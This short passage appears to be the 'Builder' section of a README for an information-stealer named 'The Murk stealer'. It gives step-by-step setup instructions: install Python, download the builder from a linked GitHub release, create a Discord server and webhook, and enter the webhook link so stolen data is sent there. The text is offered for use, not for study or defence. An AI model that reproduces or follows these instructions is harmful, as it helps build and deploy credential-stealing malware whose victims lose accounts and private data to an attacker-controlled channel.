### 🔨Builder

__So firstly you need to download [python](https://www.python.org/downloads/). Then you need to download the builder [here](https://github.com/Nick-Vinesmoke/The-Murk-stealer/releases/tag/The_Murk_v6.0.2). 
After that, you need to create your Discord server and webhook there. [How to do it](https://hookdeck.com/webhooks/platforms/how-to-get-started-with-discord-webhooks#conclusion).
Finally, insert the name and webhook link in the builder. And wait, secure building will take about 2 minutes.__
